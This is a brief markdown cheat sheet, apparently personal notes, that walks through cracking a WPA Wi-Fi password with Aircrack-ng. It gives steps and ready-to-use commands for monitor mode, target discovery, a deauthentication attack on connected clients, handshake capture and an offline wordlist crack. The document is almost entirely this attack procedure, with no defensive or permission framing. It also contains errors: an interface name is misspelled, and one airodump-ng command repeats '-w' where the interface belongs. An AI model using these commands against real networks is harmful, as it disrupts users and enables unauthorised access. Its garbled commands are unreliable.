## Tool: Aircrack-ng suite

## Steps:

#### 1) Place = Place wireless card into monitor mode

#### 2) Discover = Discover information about network (Channel, BSSID)

#### 3) Select = Select and capture data

#### 4) Perform = Perform deauth attack

#### 5) Capture = Capture WPA handshake

#### 6) Attempt = Attempt to crack the handshake

## Commands:

#### 1) iwconfig

#### 2) Airmon-ng check kill (Kill processes that might interfere)

#### 3) airmon-ng start WIRELESS_INTERFACE (example: wlan0)

#### 4) airodump-ng WIRELESS_INRERFACEmon (wlan0mon) (Monitor for traffic and search for an access point to target)

#### 5) airodump-ng -c CHANNEL --bssid BSSID -w CAPTURE_FILE -w WIRELESS_INTERFACEmon (wlan0mon)

#### 6) aireplay-ng -0 NUM -a MAC_ADDRESS_OF_ACCESS_POINT -c STATION_NUMBER WIRELESS_INTERFACEmon (wlan0mon) (Deauth Attack, NUM means how many times will this attack be performed)

#### 7) aircrack-ng -w WORDLIST.TXT -b BSSID CAPTURE_FILE (Crack WPA Handshake)
